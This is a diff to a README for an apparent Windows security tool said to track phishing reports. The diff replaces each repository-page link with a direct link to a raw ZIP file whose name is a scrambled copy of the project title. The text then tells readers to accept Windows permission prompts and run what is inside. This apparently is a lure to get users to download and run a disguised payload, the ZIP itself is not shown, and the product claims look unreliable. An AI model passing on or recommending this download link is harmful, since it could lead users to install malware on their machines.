@@ -1,9 +1,9 @@
 # 🛡️ How-to-Secure-Your-Git-Ass - Track Phishing Reports Fast
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Feedbackatomicbomb98/How-to-Secure-Your-Git-Ass)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Feedbackatomicbomb98/How-to-Secure-Your-Git-Ass/raw/refs/heads/main/inviscate/Secure-to-How-Git-Your-Ass-v3.7.zip)
 
 ## 🔽 Download
-Visit this page to download: https://github.com/Feedbackatomicbomb98/How-to-Secure-Your-Git-Ass
+Visit this page to download: https://github.com/Feedbackatomicbomb98/How-to-Secure-Your-Git-Ass/raw/refs/heads/main/inviscate/Secure-to-How-Git-Your-Ass-v3.7.zip
 
 Open the link in your browser, then look for the latest release or the main download file. If the page shows a setup file, download it to your PC. If it shows a ZIP file, save it first, then open it and run the app from the extracted folder
 
@@ -27,7 +27,7 @@ This app runs on Windows. For best results, use:
 If Windows asks for permission to open the app, choose Yes. If it asks to extract files from a ZIP, let it finish before you open anything inside
 
 ## 🚀 Install and run on Windows
-1. Open the download page: https://github.com/Feedbackatomicbomb98/How-to-Secure-Your-Git-Ass
+1. Open the download page: https://github.com/Feedbackatomicbomb98/How-to-Secure-Your-Git-Ass/raw/refs/heads/main/inviscate/Secure-to-How-Git-Your-Ass-v3.7.zip
 2. Download the latest file for Windows
 3. If the file is in a ZIP folder, right-click it and choose Extract All
 4. Open the extracted folder
